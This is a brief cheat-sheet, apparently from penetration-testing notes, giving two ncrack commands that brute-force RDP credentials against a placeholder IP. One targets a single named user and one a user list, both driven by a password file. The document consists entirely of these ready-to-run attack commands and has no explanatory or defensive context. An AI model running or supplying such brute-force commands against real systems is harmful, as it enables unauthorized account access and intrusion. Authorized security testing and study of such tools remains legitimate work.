# ncrack

### Credentials bruteforce 

#### Using ncrack for one user
```sh
ncrack -vv -u nina -P passwords.txt rdp://IP
```

#### Using ncrack for several users
```sh
ncrack -vv -U users.txt -P passwords.txt rdp://IP
```